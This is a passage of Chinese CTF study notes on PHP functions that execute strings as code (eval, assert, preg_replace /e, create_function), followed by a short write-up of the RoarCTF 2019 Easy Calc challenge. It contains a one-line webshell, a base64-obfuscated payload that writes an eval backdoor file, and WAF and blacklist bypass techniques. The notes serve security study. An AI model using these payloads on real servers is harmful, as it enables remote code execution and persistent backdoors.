把字符串 $code 作为PHP代码执行。
很多常见的 webshell 都是用eval 来执行具体操作的。

2. bool assert ( mixed $assertion [, string $description ] )
检查一个断言是否为 FALSE。（把字符串 $assertion 作为PHP
代码执行）
<?php $_GET[a]($_GET[b]);?>
?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};

3. mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码
preg_replace("/test/e",$_GET["h"],"jutst test");
如果我们提交 ?h=phpinfo()，phpinfo()将会被执行
 
string create_function ( string $args , string $code )
$newfunc = create_function(‘$v‘, ‘return system($v);‘);
$newfunc(‘whoami‘);就相当于system(‘whoami‘);
```

### [RoarCTF 2019]Easy Calc

计算机绕过题。不允许num传递字母，在num参数前面加空格，waf找不到该变量

scandir(/)扫目录，利用chr编码绕过黑名单，

后面print_r或者var_dump接file_get_contents打印flag